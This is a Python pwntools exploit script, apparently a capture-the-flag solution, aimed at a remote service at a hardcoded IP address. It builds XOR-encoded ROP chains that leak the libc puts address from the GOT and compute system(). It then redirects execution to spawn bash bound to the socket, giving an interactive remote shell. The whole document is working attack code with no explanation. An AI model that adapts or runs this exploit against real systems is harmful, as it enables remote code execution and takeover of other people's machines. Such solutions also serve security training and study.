from pwn import *
import sys

sh = remote('54.152.37.20', 24242)

def encode(s, x=p32(0x64646464)):
    r = ""
    for i in range(len(s)):
        r += chr(ord(s[i])^ord(x[i]))
    return r

leave_ret = 0x804889f
pppp_ret = 0x080578f8
puts_got = 0x805f02c
sock_send = 0x804884B

puts_addr = 0xf75dbc10                              # place the leaked puts at here
#puts_addr = 0
system_addr = puts_addr - 0x64c10 + 0x3fcd0
func_52 = 0x805F240
recv_addr = 0x8048720
recv_again = 0x08056A81

p  = "8"                                            # call func6a
p += "\x00"*3

# for leak address
lp  = encode(p32(sock_send))
lp += encode(p32(leave_ret))
lp += encode(p32(4))                # fd
lp += encode(p32(puts_got))
lp += encode(p32(4))
lp += "\x00"*(0x60-len(lp))

# for execute CMD
ep  = encode(p32(recv_addr))
ep += encode(p32(pppp_ret))
ep += encode(p32(4))                # fd
ep += encode(p32(func_52))
ep += encode(p32(4))
ep += encode(p32(0))
ep += encode(p32(recv_again))
ep += encode(p32(leave_ret))
ep += encode(p32(4))                # fd
ep += "\x00"*(0x60-len(ep))

if puts_addr:
    p += ep
else:
    p += lp
p += "\x00"*4
p += "\x00"*8
p += p32(0x6e0)                                     # EBP
p += encode(p32(leave_ret), p32(0x08056afa))        # EIP
p += "\x00"*4                                       # arg1
p += encode(p32(0x1), p32(len(p)+4))                # arg2


print "payload length = " + hex(len(p))
sh.sendline(p)

if puts_addr:
    sh.send(p32(system_addr))
    sh.sendline(" bash 1>&4 0<&4")
    sh.interactive()
else:
    try:
        leak = sh.recv(4)
        puts_addr = u32(leak)
        print "leaked puts @ " + hex(puts_addr)
    except:
        print "leak failed"
    quit()

